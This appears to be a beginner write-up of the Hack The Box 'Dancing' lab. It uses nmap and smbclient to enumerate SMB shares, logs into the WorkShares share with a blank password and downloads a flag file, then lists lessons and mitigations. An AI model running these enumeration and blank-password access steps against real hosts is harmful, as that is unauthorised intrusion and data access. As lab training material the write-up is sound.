# Dancing — HTB Starting Point

- Platform: Hack The Box — Starting Point (Tier 1)
- OS: Windows
- Difficulty: Beginner

## Reconnaissance

```bash
nmap -sV <TARGET_IP>
```

Open ports:

| Port | Service | Notes |
|---|---|---|
| 135 | msrpc | RPC |
| 139 | netbios-ssn | SMB over NetBIOS |
| 445 | microsoft-ds | SMB — main entry point |

## SMB Enumeration

```bash
smbclient -L //<TARGET_IP>
```

Shares found:

| Share | Accessible without a password |
|---|---|
| ADMIN$ | No |
| C$ | No |
| IPC$ | No |
| WorkShares | Yes |

```bash
smbclient //<TARGET_IP>/ADMIN$     # access denied
smbclient //<TARGET_IP>/C$         # access denied
smbclient //<TARGET_IP>/IPC$       # access denied
smbclient //<TARGET_IP>/WorkShares # success — blank password
```

## Foothold

```bash
smbclient //<TARGET_IP>/WorkShares
```

Logged in with a blank password (just pressed Enter at the prompt).

```
smb: \> ls
smb: \> cd James.P\
smb: \> ls
smb: \> get flag.txt
smb: \> exit
```

```bash
cat flag.txt
```

| Flag | Location |
|---|---|
| User flag | `WorkShares\James.P\flag.txt` |

## Attack Narrative

Nmap identified port 445 open — SMB. `smbclient -L` enumerated four shares: ADMIN$, C$, IPC$, and WorkShares. The first three required valid credentials and denied access. WorkShares accepted a blank password. Inside the share, the `James.P` folder contained `flag.txt`, downloaded with `get`.

## Lessons Learned

- SMB (Server Message Block) operates on port 445.
- `smbclient -L //<IP>` lists all shares exposed by a host.
- Shares accessible without a password are a common real-world misconfiguration.
- `get <filename>` downloads a file locally from within an SMB session.
- Always test every discovered share, not just the first one.

## Mitigation

- Require authentication on all SMB shares; disable null/blank-password sessions.
- Apply least-privilege access controls per share.
- Regularly audit share permissions with tools like `enum4linux` or `smbmap` from the defender's side as well.
